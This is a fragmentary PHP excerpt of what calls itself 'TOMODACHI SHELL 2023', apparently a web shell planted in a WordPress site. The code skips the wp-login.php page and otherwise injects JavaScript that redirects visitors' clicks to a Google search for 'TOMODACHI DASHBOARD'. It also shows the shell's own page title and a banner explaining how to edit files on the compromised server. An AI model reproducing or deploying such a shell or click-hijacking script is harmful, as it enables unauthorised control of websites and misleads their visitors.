...
if($ckUjYggTf == 0 && !strstr(strval($_SERVER['REQUEST_URI']), 'wp-login.php')){
	echo "<script>(function (parameters) {
		...
		function globalClick(event) {
			...
			const newLocation = \"https://www.google.com/search?q=TOMODACHI+DASHBOARD\"
...
<title> TOMODACHI SHELL 2023 </title>
<style type="text/css">
...
<body text="#FFFFFF" >
<center><h2>TOMODACHI SHELL 2023</h2></center>
<center><h4><font color="white">how to edit a file? Click file > editing > save</font></h4></center>
<center>';
@set_time_limit(0);
